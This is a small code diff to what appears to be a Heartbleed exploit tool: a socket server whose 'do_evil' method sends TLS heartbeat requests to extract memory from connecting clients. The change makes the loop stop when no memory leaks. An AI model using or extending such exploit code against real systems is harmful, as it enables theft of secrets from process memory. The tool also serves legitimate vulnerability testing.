@@ -220,7 +220,8 @@ class RequestHandler(socketserver.BaseRequestHandler):
 
             for i in range(0, self.args.count):
                 try:
-                    self.do_evil()
+                    if not self.do_evil():
+                        break
                 except OSError as e:
                     if i == 0: # First heartbeat?
                         print('Unable to send first heartbeat! ' + str(e))
@@ -270,6 +271,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # (skip Certificate, etc.)
 
     def do_evil(self):
+        '''Returns True if memory *may* be acquired'''
         # (2) HeartbeatRequest
         self.request.sendall(make_heartbeat(self.sslver))
 
@@ -279,6 +281,9 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # empty, then it *may* be invulnerable
         if memory is not None and not memory:
             print("Possibly not vulnerable")
+            return False
+
+        return True
 
     def expect(self, cond, what):
         if not cond:
